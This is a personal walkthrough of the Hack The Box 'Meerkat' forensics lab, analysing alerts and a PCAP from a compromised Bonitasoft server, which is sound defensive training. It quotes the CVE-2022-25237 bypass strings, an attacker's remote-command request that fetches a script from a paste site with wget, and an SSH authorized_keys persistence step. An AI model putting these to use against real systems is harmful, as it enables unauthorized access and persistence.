---
{"dg-publish":true,"permalink":"/meerkat/"}
---

###### Summary 
 This Sherlock is focusing on working with Zeek logs and network analysis using PCAP.
 
[Link to this Sherlock on HTB Labs](https://app.hackthebox.com/sherlocks/552/play)

I used Timeline Explorer to process alert logs because I was working on Windows VM without WSL. Alternatively, jq could be used. For network analysis I used Wireshark, but Tshark was also required to answer one of the questions.
###### Challenge Scenario
"As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised."
###### Walkthrough
1. We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?
	While going through alert logs, I identified the following alert: `@{severity=1; signature=ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237); category=Attempted Administrator Privilege Gain; action=allowed; signature_id=2036818; gid=1; rev=1; metadata=}` at 2023-01-19T15:31:31.042Z

2. We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?
	There a lot of HTTP Post requests containing credentials of work accounts. This is a sign of a credential stuffing.

3. Does the vulnerability exploited have a CVE assigned - and if so, which one?: 
	Answer to question 3 can be found initially during alerts analysis.

4. Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?: 
	While reading about the exploit https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/ I found out that Bonita appends either “/i18ntranslation/../” or “;i18ntranslation” to the API URL to allow authorization to be bypassed. I correlated this info with pcap in Wireshark and found the answer.
	![Pasted image 20250212150133.png](/img/user/Pasted%20Images/Pasted%20image%2020250212150133.png)

5. How many combinations of usernames and passwords were used in the credential stuffing attack?: 
	Not difficult question yet I stuck here and had to address the official write-up. My Wireshark display filter `http.request.full_uri == "http://forela.co.uk:8080/bonita/loginservice" && !http` contains "install" was displaying 59 entries, but there were 3 repetitions in the very end which shouldn't have been counted. After additional research I concluded that the easiest way to find the solution to this question with a filters would be through Tshark command 
	`tshark -Y '(http.request.uri == "/bonita/loginservice") && (!http contains "install")' -r meerkat.pcap -T json | jq '.[]._source.layers.http."http.file_data"' | sort | uniq | wc -l`

6. Which username and password combination was successful?
	Looking through network logs we can see someone running a command whoami, it prompted me to follow HTTP stream and I was able to see there authentication attempt with positive response, namely status code 204.
	
	*The HTTP 204 No Content status code indicates that the server has successfully processed the request, but there is no content to send in the response body. This status code is particularly useful for operations that do not require the client to navigate away from the current page or display any new information. ![Pasted image 20250216102441.png](/img/user/Pasted%20Images/Pasted%20image%2020250216102441.png)

7. If any, which text sharing site did the attacker utilise?
	Continuing investigating Wireshark logs we are able to see a GET request with remote command execution which has a website URL that fits out description. 
	`GET/bonita/API/extension/rcep=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8 HTTP/1.`

8. Please provide the filename of the public key used by the attacker to gain persistence on our host.
	If we carefully follow the link above (using Browserling, for example) we can see a bash script that appends data from https://pastes.io/raw/hffgra4unv to `/home/ubuntu/.ssh/authorized_keys`. The data it retrieves is SSH key, and it is also seen that TA executes ssh restart after getting the key. Hence, we can conclude this is used to achieve persistence.

9. Can you confirm the file modified by the attacker to gain persistence?
	Answer can be found in the previous question.

10. Can you confirm the MITRE technique ID of this type of persistence mechanism?
	Account Manipulation: SSH Authorized Keys sub-technique is on MITRE website, which confirms the previous assumption.

 